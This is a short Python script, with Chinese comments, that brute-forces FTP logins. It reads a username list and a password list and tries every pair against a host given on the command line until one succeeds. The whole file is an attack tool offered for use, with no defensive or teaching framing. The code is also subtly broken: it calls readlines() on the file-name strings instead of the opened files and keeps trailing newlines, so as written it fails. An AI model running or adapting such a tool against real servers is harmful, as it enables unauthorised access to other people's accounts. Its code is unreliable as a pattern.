#coding = utf-8
#create 2020/12/2
#暴力破解ftp
import ftplib
import sys

def brute_ftp(hostname, user_file, password_file):
    ftp_object = ftplib.FTP(host=hostname)
    with open(user_file,'r') as u_f:
        with open(password_file,'r') as p_f:
            # 两个文件的互相操作可能有问题,先读取到列表再操作
            user_list = user_file.readlines()
            password_list = password_file.readlines()
            for user in user_list:
                for password in password_list:
                    try:
                        ftp_object.login(user,password)
                        print('login successful'+user+password)
                        return True
                    except:
                        pass

    print('this dict is small')
    return  False
brute_ftp(sys.argv[1],sys.argv[2],sys.argv[3])




